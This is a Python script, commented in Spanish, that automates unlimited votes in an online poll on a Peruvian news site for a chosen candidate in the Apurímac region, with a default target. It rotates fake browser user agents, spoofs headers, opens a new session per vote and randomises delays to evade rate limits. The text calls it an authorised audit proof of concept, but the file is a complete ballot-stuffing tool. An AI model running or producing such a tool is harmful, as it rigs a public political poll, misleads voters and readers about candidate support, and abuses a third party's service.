import argparse
import io
import json
import random
import sys
import time

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

import requests

BASE_URL = "https://peruinformativo.com/api.php"

CANDIDATOS = {
    "gustavo": {"nombre": "Gustavo Alejandro Gutierrez Ortiz", "partido": "Acción Popular", "unique": "544682"},
    "guido": {"nombre": "Guido Chahuaylla Maldonado", "partido": "Progresemos", "unique": "456585"},
    "elvyn": {"nombre": "Elvyn Samuel Diaz Tello", "partido": "Ahora Nación - AN", "unique": "686281"},
    "david": {"nombre": "David Damiano Vega", "partido": "Partido Demócrata Unido Perú", "unique": "910598"},
    "blas": {"nombre": "Blas Barrientos Altamirano", "partido": "Juntos por el Perú", "unique": "599821"},
}

SLUG = "region-apurimac"

MAX_INTENTOS = 3
BACKOFF = [2, 4, 8]
MAX_FALLOS_SEGUIDOS = 5
PAUSA_TRAS_FALLOS = 45
BARRAS = 20

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]


def build_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "es-PE,es;q=0.9,en;q=0.8",
        "Referer": "https://peruinformativo.com/region-apurimac",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }




def send_vote(session, unique):
    params = {"acc": "send", "c": SLUG, "u": unique}
    resp = session.get(BASE_URL, params=params, headers=build_headers(), timeout=(10, 30))
    try:
        data = resp.json()
    except (json.JSONDecodeError, ValueError):
        data = {"raw": resp.text}
    return resp.status_code, data


def format_time(seconds):
    seconds = max(0, int(seconds))
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


def progress_line(actual, total, procesado, elapsed, avg_per_vote):
    pct = (actual / total * 100) if total else 0
    filled = int(round(BARRAS * actual / total)) if total else 0
    bar = "#" * filled + "-" * (BARRAS - filled)

    if actual > 0 and avg_per_vote is not None:
        restante = avg_per_vote * (total - actual)
    else:
        restante = 0

    line = (
        f"Solicitados: {actual}/{total} | Procesado: {procesado} | "
        f"[{bar}] {pct:.1f}% | Restante: {format_time(restante)}"
    )
    return line


def main():
    parser = argparse.ArgumentParser(
        description="PoC: voto ilimitado en el endpoint de Peru Informativo (auditoría de seguridad autorizada)."
    )
    parser.add_argument("--cantidad", type=int, required=True, help="Número de votos a emitir.")
    parser.add_argument(
        "--candidato",
        choices=list(CANDIDATOS.keys()),
        default="elvyn",
        help="Alias del candidato (por defecto: elvyn).",
    )
    parser.add_argument("--retraso", type=float, default=None, help="Segundos fijos entre votos.")
    parser.add_argument("--rapido", action="store_true", help="Retraso mínimo (~1-2s).")
    parser.add_argument("--dry-run", action="store_true", help="Emite 1 solo voto de prueba y se detiene.")
    args = parser.parse_args()

    can = CANDIDATOS[args.candidato]
    print(f"Candidato objetivo: {can['nombre']} ({can['partido']})  unique={can['unique']}")
    print(f"Endpoint: {BASE_URL}?acc=send&c={SLUG}&u={can['unique']}")

    total = 1 if args.dry_run else args.cantidad
    ok = 0
    failed = 0
    procesado = 0
    fallos_seguidos = 0
    start_time = time.time()

    for i in range(1, total + 1):
        if args.rapido:
            delay = random.uniform(1.0, 2.0)
        elif args.retraso is not None:
            delay = args.retraso
        else:
            delay = random.uniform(3.0, 6.0)

        session = requests.Session()
        success = False
        data = None
        status = None

        for intento in range(1, MAX_INTENTOS + 1):
            try:
                status, data = send_vote(session, can["unique"])
                procesado += 1
                success = data.get("e", 1) == 0 if "e" in data else False
                break
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as exc:
                procesado += 1
                if intento < MAX_INTENTOS:
                    espera = BACKOFF[intento - 1]
                    try:
                        sys.stdout.write(
                            f"\rTimeout (intento {intento}/{MAX_INTENTOS}), "
                            f"reintentando en {espera}s...   \n"
                        )
                        sys.stdout.flush()
                    except Exception:
                        pass
                    time.sleep(espera)
                else:
                    data = {"m": f"fallo tras {MAX_INTENTOS} intentos ({type(exc).__name__})"}

        session.close()

        if success:
            ok += 1
            fallos_seguidos = 0
        else:
            failed += 1
            fallos_seguidos += 1

        elapsed = time.time() - start_time
        avg_per_vote = elapsed / i if i else 0

        try:
            sys.stdout.write(
                "\r" + progress_line(ok, total, procesado, elapsed, avg_per_vote) + "   "
            )
            sys.stdout.flush()
        except Exception:
            pass

        if args.dry_run:
            print("\n\n--- Respuesta cruda (dry-run) ---")
            print(json.dumps(data, ensure_ascii=False, indent=2) if data else "sin respuesta")
            break

        if i < total:
            time.sleep(delay)

        if fallos_seguidos >= MAX_FALLOS_SEGUIDOS:
            print(f"\n[!] {fallos_seguidos} fallos seguidos. Pausando {PAUSA_TRAS_FALLOS}s...", flush=True)
            time.sleep(PAUSA_TRAS_FALLOS)
            fallos_seguidos = 0

    print("\n\n========== RESUMEN ==========")
    print(f"Votos solicitados : {total}")
    print(f"Votos exitosos    : {ok}")
    print(f"Procesado         : {procesado}")
    print(f"Fallos            : {failed}")
    print(f"Tiempo total      : {format_time(time.time() - start_time)}")
    if args.dry_run:
        ok_flag = "REGISTRADO" if ok else "NO registrado"
        print(f"Resultado dry-run : voto {ok_flag}")
    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
